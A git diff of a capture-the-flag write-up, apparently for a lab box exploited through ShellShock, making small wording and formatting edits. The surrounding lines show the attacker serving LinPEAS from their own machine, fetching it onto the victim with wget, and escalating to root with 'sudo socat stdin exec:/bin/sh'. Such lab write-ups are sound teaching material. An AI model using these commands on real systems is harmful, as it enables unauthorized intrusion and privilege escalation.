@@ -72,7 +72,7 @@ Now we have a shell as www-data.  After looking around we find a user named scot
 
 ![image](https://user-images.githubusercontent.com/50459517/102672947-e717f800-4157-11eb-89d5-aa3c19b5d8e5.png)
 
-With that out of the way, I normally like to run some type of post-enumeration script line LinPEAS.  We can just host up the file with **python -m SimpleHTTPServer 80** on our machine and then `wget http://ip/linpeas.sh` onto the victim machine in a directory we have rwx permissions in (i.e. /tmp)
+With that out of the way, I normally like to run some type of post-enumeration script line LinPEAS.  We can just host up the file with **python -m SimpleHTTPServer 80** on our machine and then **wget http://ip/linpeas.sh** onto the victim machine in a directory we have rwx permissions in (i.e. /tmp)
 
 ![image](https://user-images.githubusercontent.com/50459517/102673038-2d6d5700-4158-11eb-9eb9-a0523ab69804.png)
 
@@ -94,4 +94,4 @@ Per GTFOBins, we see we can run **sudo socat stdin exec:/bin/sh** to escalate ou
 
 ![image](https://user-images.githubusercontent.com/50459517/102673108-686f8a80-4158-11eb-94d1-7fb4b2343874.png)
 
-And that's it!  This was a fun little box that shows a pretty straight forward vulnerability in ShellShock as well as a common mis-configuration seen with allow low level users to run certain programs/files as elevated users.
+And that's it!  This was a fun little box that shows a pretty straight forward vulnerability in ShellShock as well as a common mis-configuration seen that can allow low level users to run certain programs/files as elevated users.
